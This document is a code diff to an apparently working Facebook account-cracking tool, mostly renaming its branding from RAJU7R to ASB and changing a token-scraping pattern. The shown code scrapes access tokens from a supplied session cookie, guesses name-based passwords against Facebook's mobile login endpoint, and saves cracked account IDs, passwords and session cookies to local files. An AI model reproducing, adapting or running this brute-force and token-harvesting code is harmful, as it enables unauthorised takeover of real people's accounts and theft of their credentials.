@@ -140,7 +140,7 @@ def Public():
 		try:
 			cookie=input(" [+] Cookie : ")
 			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
-			find_token = re.search("(EAAG\w+)", data.text)
+			find_token = re.search("(EAAA\w+)", data.text)
 			ken=open(".token.txt", "w").write(find_token.group(1))
 			print (" [] Login Successful")
 			login()
@@ -215,7 +215,7 @@ def setting():
 	passmenu()
 def passmenu():
 	clear()
-	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
+	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+password')
 	passmen=input('\n [#] Select Pass : ')
 	if passmen in ['1','01']:
 		first()
@@ -324,14 +324,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ RAJU7R-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ ASB-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ RAJU-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ ASB-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ RAJU7R ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ ASB ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -829,7 +829,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ RAJU7R ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ ASB ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
